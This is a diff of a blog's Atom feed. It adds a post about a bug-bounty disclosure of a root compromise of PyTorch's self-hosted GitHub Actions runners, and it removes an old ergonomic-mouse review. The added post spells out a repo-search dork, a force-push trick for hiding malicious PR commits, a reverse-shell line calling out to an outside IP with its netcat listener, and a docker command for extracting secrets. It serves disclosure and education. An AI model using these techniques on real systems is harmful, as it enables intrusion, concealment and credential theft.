@@ -4,7 +4,7 @@
   <title><![CDATA[Marcus Young]]></title>
   <link href="https://marcyoung.us/atom.xml" rel="self"/>
   <link href="https://marcyoung.us/"/>
-  <updated>2022-07-09T18:01:17+00:00</updated>
+  <updated>2022-09-06T02:10:08+00:00</updated>
   <id>https://marcyoung.us/</id>
   <author>
     <name><![CDATA[Marcus Young]]></name>
@@ -12,6 +12,126 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Zuckerpunch - Abusing self hosted github runners at Facebook]]></title>
+    <link href="https://marcyoung.us/post/zuckerpunch"/>
+    <updated>2022-08-25T00:00:00+00:00</updated>
+    <id>https://marcyoung.us/post/zuckerpunch</id>
+    <content type="html"><![CDATA[<p>I abused Github Actions to get full root into the PyTorch ci runners. <!-- more --></p>
+
+<p><br/>
+<br/></p>
+
+<h3>Timeline</h3>
+
+<ul>
+<li><code>4/18</code> Initial research/exploit with an automated case response.</li>
+<li><code>4/20</code> First human response to forward to the pytorch team.</li>
+<li><code>4/27</code> I reached out to follow up.</li>
+<li><code>5/11</code> Meta responds that there is no update.</li>
+<li><code>6/9</code> I reach out again to ask about bounty terms and push for a >6 week response.</li>
+<li><code>6/22</code> Meta responds: <code>Unfortunately after discussing this with the product team this isn't an issue we're going to fix or reward, although code execution is possible on these machines its by design and additionally the product team has mentioned that the actions are spun up on short lived nodes (similarly to how github operates their own action runners) which limits the impact further.</code></li>
+<li><code>6/24</code> I respond with multiple follow ups explaining (and again exploiting further) the scope and severity including secrets exfiltration and prove lateral movement abilities. I exploit it further and PyTorch notices and bans my user. I set up a zoom call to talk.</li>
+<li><code>6/27</code> Call goes well, team is respectful and insightful, discuss remediation, things affected and scope.</li>
+<li><code>6/30 - 7/22</code> I use favors to get in contact with the team after another month of no responses.</li>
+<li><code>7/22</code> - Meta responds &lsquo;We&rsquo;re still in discussion with the product team&rsquo; and refuses further discussion about impact and bounty</li>
+<li><code>8/16</code> - Another follow up sent with no responses.</li>
+<li><code>8/19</code> - After more favors I&rsquo;m able to escalate it to a new security engineer at meta that provides an extremely long and helpful response</li>
+<li><code>8/22 - 8/24</code> - Back and forth about scope and impact</li>
+<li><code>8/24</code> Resolved and $10,000 bounty paid out with a 7.5% bonus due to timeline</li>
+</ul>
+
+
+<p><br/>
+<br/></p>
+
+<h3>The Gritty</h3>
+
+<p>I run a somewhat successful open source <a href="https://github.com/myoung34/docker-github-actions-runner">github action runner project</a></p>
+
+<p>Github provides CI runners but they have some nuances around configuration and ability. You can run your own, however, if you have special needs such as hardware requirements, security policies, etc.</p>
+
+<p>There&rsquo;s a lot of <a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners">information</a> around the hardening of these that indicate that <a href="https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security">running them on public repos is a bad idea</a>.</p>
+
+<p>That said: if you need to you still can but you should be mindful of a few settings.</p>
+
+<p>The most important setting is what I decided to go after.</p>
+
+<p><img src="https://marcyoung.us/images/gha.png"></p>
+
+<p>That first checkbox isn&rsquo;t the default, but if you&rsquo;re not careful it seems safer than it is. What it means is that if you&rsquo;re not a new user, you can submit changes to the CI yaml and itll affect what&rsquo;s run in the PR. So that&rsquo;s what I did.</p>
+
+<p>I spent an hour or so using carefully crafted google search like <code>site:github.com inurl:workflows +"self-hosted"</code> and pulled up around maybe 30  or so candidates.</p>
+
+<p>The issue is that there&rsquo;s no way to know if they have this checkbox until you open a PR and you potentially notify people of what you&rsquo;re doing.</p>
+
+<p>Throughout these pull-requests I was able to further abuse a github UI bug that let&rsquo;s me &ldquo;hide my commit&rdquo; and it appears as though I merged my PR. It&rsquo;s confusing and weird but it removes the ability for them to see what I was doing.</p>
+
+<p><img src="https://marcyoung.us/images/gha1.png"></p>
+
+<p>What I did here was:</p>
+
+<ul>
+<li>Fork the repo.</li>
+<li>Make a change to github actions workflows that appear to have self hosted runners looking for jobs (making sure to keep <code>runs-on: self-hosted</code>) with something like: <code>run: echo "Testing refactor"</code>.</li>
+<li>Push the commit with a boring message like &ldquo;Refactoring&rdquo;.</li>
+<li>Immediately do <code>git rebase -i HEAD^</code>. This is the key part. This basically resets my branch to the default branches SHA. Meaning there&rsquo;s no difference at all in tree history between the default branch (that I targeted for a PR) and the current branch/PR now.</li>
+<li><code>git push origin {branch_name} -f</code></li>
+</ul>
+
+
+<p>The bug above is simply that the github UI now sees no changes to the branch (0 files changed). And since the SHA exists as the HEAD SHA on the default branch: it looks merged. Now there&rsquo;s no way to see what I did. The emails from git only show a link to the PR with some metadata that a file changed, but not what. If someone had an integration it would have had to be able to pull the diff from my SHA to theirs <em>immediately</em>. Because I force pushed it&rsquo;s no longer in existence in my fork so it&rsquo;s gone forever and after a few seconds there&rsquo;s no way to pull what my change showed.</p>
+
+<p>The best part is: it already kicked off a potential github actions run though.</p>
+
+<p>So here one of two things happens:</p>
+
+<ul>
+<li>It runs and you&rsquo;ll know because you&rsquo;d see <code>echo "Testing refactor"</code></li>
+<li>It doesn&rsquo;t run because they had the checkboxes set correctly and you&rsquo;d see this:</li>
+</ul>
+
+
+<p><img src="https://marcyoung.us/images/gha2.png"></p>
+
+<p>Now it&rsquo;s late at night, I&rsquo;ve sumbitted and undone roughly 30 PR&rsquo;s until I get a hit.</p>
+
+<p>PyTorch.</p>
+
+<p>This repo has a <em>ton</em> of yml in all shapes and fashion. And it makes sense to use self-hosted because of all the specialized hardware to run GPU acceleration.</p>
+
+<p>I basically had full reign to any of these now that I can submit any change to CI.</p>
+
+<p>The question is only: is there monitoring in place? Honestly this isn&rsquo;t common because CI is just all over the place. Tests change, infra is all over the place with requirements changing in dependencies, etc.</p>
+
+<p>So I decided to shell in with a reverse shell. A reverse shell means I&rsquo;m going to make it connect to something I have so that I can get into it as opposed to me going into it directly. Same result, but backwards. To do that I spun up a small digital ocean box and set up a reverse shell listener with <code>nc -u -lvp 9001</code></p>
+
+<p>On CI I issued a pull-request with
+<br/>
+<code>run: sh -i 5&lt;&gt; /dev/tcp/143.110.155.178/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</code></p>
+
+<p>On my digital ocean box: I&rsquo;m now connected to the machine.</p>
+
+<p>From here I noticed 2 things:</p>
+
+<ul>
+<li>Some of these instances are ephemeral AWS instances that have root by default and a file with plaintex IAM user keys for circleci</li>
+<li>Some of these intances were less ephemeral Jenkins instances that didnt run as root but allowed sudo.</li>
+</ul>
+
+
+<p>Basically they wouldn&rsquo;t live forever but I had root on both.</p>
+
+<p>My first attempt was to exfiltrate CI secrets but this didn&rsquo;t quite work because forks cant exfiltrate secrets via the actions yaml (theyre not in the forked repo). I was able to prove, however, that a few things such as Android builders ran via docker and would land on these instances with the secrets nightly + on-demand. I can&rsquo;t force that to happen but I would be able to exfiltrate the signing key once the docker container was running with <code>docker inspect {container id} | jq '.[].Config.Env[0]'</code></p>
+
+<p>Next: AWS abuse. I wasn&rsquo;t able to find out directly but these instances had access to many s3 buckets. They likely had write access to some meaning I could plant files but that&rsquo;s boring. What they did have though was ECR image support. Without ECR Immutable tags on (confirmed) I would be able to rebuild any image for use by downstream internal projects. Meaning that if downstreams werent locking images to their build SHA&rsquo;s (most dont on latest or semver tags in general) I could implant anything into these containers and re-push them so that downstream projects would pull them. The effect of this at this time is unknown as this isnt the pytorch distributable, but the hope would have been that I could supply-chain internally. This scope stays &ldquo;tbd&rdquo;.</p>
+
+<p>It also didn&rsquo;t appear that these run in a VPC meaning that unless security software is installed there&rsquo;s nothing to prevent me from doing boring malicious stuff like mine crypto, blast emails, etc. If it were in a VPC I&rsquo;d still have this possibility but things like GuardDuty (if enabled) would catch me doing things and flag it as irregular activity. Not worth it here and a good way to violate reasonable disclosure.</p>
+
+<p>The IAM access (both from the role attached to the instance) and the IAM user were overprovisioned and also contributed to the bounty. The PyTorch team is futher lowering the permissions here to only necessary as well as (I&rsquo;m assuming) bucket policies to match.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Building a digital Pinball]]></title>
@@ -2791,76 +2911,6 @@ All the env vars are pulled from <a href="https://www.vaultproject.io">vault</a>
 
 <p><img class="left" src="https://marcyoung.us/images/ergoslider1.jpg">
 <img class="left" src="https://marcyoung.us/images/ergoslider2.jpg"></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Ergonomic Mouse Review]]></title>
-    <link href="https://marcyoung.us/post/ergo-mouse-review"/>
-    <updated>2017-06-26T00:00:00+00:00</updated>
-    <id>https://marcyoung.us/post/ergo-mouse-review</id>
-    <content type="html"><![CDATA[<p>I&rsquo;ve Recently been really into ergonomic mice, and wanted to give my thoughts on a few after going all in. <!-- more --></p>
-
-<p>In the last few months, I&rsquo;ve been pretty into mechanical keyboards and form factor. I&rsquo;ve been using an original (very old) Rollermouse for about 2 years now and was looking to upgrade it (the thing is huge).</p>
-
-<p>My current home setup is a Contour Rollermouse free2 and a pok3r (Cherry MX Clears) and a Logitech G700s for gaming.
-<img class="left" src="https://marcyoung.us/images/free1.jpg"></p>
-
-<p>My work set up is a TechKeys JD40 on a 1up case (80g Cherry MX browns) and a Contour Rollermouse Red.
-<img class="left" src="https://marcyoung.us/images/red1.jpg"></p>
-
-<p>While shopping around, I came upon the <a href="https://amzn.to/2tguHYQ">Penclic NiceTouch t2</a>. It caught my eye because it&rsquo;s <em>exactly</em> the same size as my pok3r. The original contourmouse is hilariously larger than my keyboard, so that&rsquo;s a huge draw.
-They sent me one to sample, so I decided to do a pro/con of my setups.</p>
-
-<h2>Contourmouse Red</h2>
-
-<p>This is by far the most sturdy of all of the mice. It&rsquo;s made of stainless steel, and could be used as a bludgeon. It doesnt move, and the rollerbar at the top is very thick with a grippy surface area to it.
-My biggest complaint with the original contourmouse was that you ran out of horizontal space. You&rsquo;d have to hold it far left to let the mouse slowly track over, or right because there was no physical space for the mouse to go left or right anymore.
-I got adjusted to it but it happened often enough to notice. With the red, this is gone. I&rsquo;m not sure if it&rsquo;s smarter or if the acceleration takes care of it, but it never happens, or just happens far less.</p>
-
-<p>All the buttons are 100% programmable in OSX/Windows via their driver. I havent tried on linux, but I&rsquo;m sure it is. The bar itself has a physical tensioner as well which is nice to add resistance. And as far as usability: it&rsquo;s great. The roller bar
-is a physical left click if you press, and everything is in the right place. I dont have to move my hands <em>at all</em> to use it.</p>
-
-<p><img class="left" src="https://marcyoung.us/images/red1.jpg">
-<img class="left" src="https://marcyoung.us/images/red2.jpg"></p>
-
-<p>The drawback is price. It&rsquo;s crazy expensive, and I got lucky to find it on ebay after months of searching/bidding for a low price. I&rsquo;m not sure it&rsquo;s worth the original MSRP, but I love it.</p>
-
-<h2>Contourmouse Free2</h2>
-
-<p>This one has most of the same pros as the Red, but I find myself getting annoyed at the physical bar occasionally. It&rsquo;s smaller than the red in terms of diameter, it&rsquo;s closer to the original contourmouse. It makes it a little harder to get your thumb on
-and move freely just because it&rsquo;s thinner. The tensioner isnt that great, so sometimes after a long coding session when my hands get a little stiff the mouse shows my thumb shakiness a little on &ldquo;exact&rdquo; clicks like on small buttons. That&rsquo;s when I can tell
-I&rsquo;ve been at it too long. And the original complaint about physical left/right exists here. I find myself out of space to go left or right and have to break focus to move the mouse over. If I were trying to do exact work like CAD/3d modelling I&rsquo;d probably
-throw it out the window by this point. It&rsquo;s great, but it&rsquo;s not worth the price considering how much nicer the Red is. Also, after only a few weeks, the palm rest started coming apart, and I used a sticker to prevent it from spreading. I can tell you right
-now though, the sticker is functionally part of it now. If I pull it off, the padding will come with it. They  call the pads replaceable, but that assumes you can find it. I can&rsquo;t find replacement pads that dont come with a full keyboard.</p>
-
-<p><img class="left" src="https://marcyoung.us/images/free1.jpg">
-<img class="left" src="https://marcyoung.us/images/free2.jpg"></p>
-
-<p>This one is not worth the price, but I&rsquo;d buy it again if it were &lt; $60.</p>
-
-<h2>Penclic NiceTouce T2</h2>
-
-<p>This is the one I was iffy about. Functionally, it&rsquo;s great. They sent me the matching keyboard, the Penclic NiceTouch C2, which is a chiclet key style keyboard. Together they work fine. If you like chiclets it types and works great.
-However, my biggest problem is not with the keyboard, but with the trackpad. As a trackpad, it&rsquo;s fine, but it doesn&rsquo;t support gestures or multi-finger. I&rsquo;ve become so used to being able to do two-finger scroll that it&rsquo;s frustrating to not have it.
-There is a physical rotating key that lets you scroll left right, but the right side of my palm kept touching it and making my cursor jump in vim.</p>
-
-<p><img class="left" src="https://marcyoung.us/images/t2_1.jpg">
-<img class="left" src="https://marcyoung.us/images/t2_4.jpg">
-<img class="left" src="https://marcyoung.us/images/t2_5.jpg">
-<img class="left" src="https://marcyoung.us/images/t2_6.jpg"></p>
-
-<p>My other complaint is with the buttons. They&rsquo;re not labeled or programmable so you <em>have</em> to read the booklet to know what buttons &frac34; do. They&rsquo;re also impossible to reach. The draw to the contourmouse design is that the bar clicks but also those buttons
-are very reachable by your thumbs. You can put your hands on the Home keys and not  have to move your hands at all to be efficient. With the T2 the buttons are so far down that they&rsquo;re not reachable, meaning I have to move my hands to click them. At that
-point I&rsquo;d rather have a mouse. Without two-finger scroll it means that I cant do anything except move my mouse up/down/left/right without moving my hands around.</p>
-
-<p><img class="left" src="https://marcyoung.us/images/t2_3.jpg"></p>
-
-<p>The only other complaint I have is that if you use the trackpad with a different keyboard (like my pok3r), it&rsquo;s too low and leave a huge gap vertically. There are no risers (like on most keyboard) to raise the trackpad, so I stuffed a piece of cardboard
-under it, but that made it a bit wobbly. I could probably 3d print something, but that&rsquo;s pretty intense for an out-of-the-box experience. Lastly, the trackpad is <em>very</em> light. So light that it moves around while using it.  It probably only weighs a few
-ounces which gives it a flemsy breakable feel. Having something that light on top of a  piece of cardboard created a very unstable setup.</p>
-
-<p><img class="left" src="https://marcyoung.us/images/t2_2.jpg"></p>
 ]]></content>
   </entry>
   
